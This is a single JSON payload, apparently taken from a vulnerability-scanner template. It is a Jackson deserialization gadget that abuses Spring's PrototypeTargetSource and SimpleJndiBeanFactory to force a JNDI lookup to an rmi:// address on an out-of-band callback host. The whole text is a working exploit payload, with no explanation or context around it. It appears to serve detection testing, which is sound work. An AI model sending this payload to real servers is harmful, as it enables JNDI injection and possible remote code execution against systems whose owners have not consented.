        {"org.springframework.aop.target.PrototypeTargetSource":{"targetBeanName":"rmi://{{Hostname}}.{{interactsh-url}}/wo-d","beanFactory":{"org.springframework.jndi.support.SimpleJndiBeanFactory":{"shareableResources":["rmi://{{Hostname}}.{{interactsh-url}}/wo-d"]}}}}

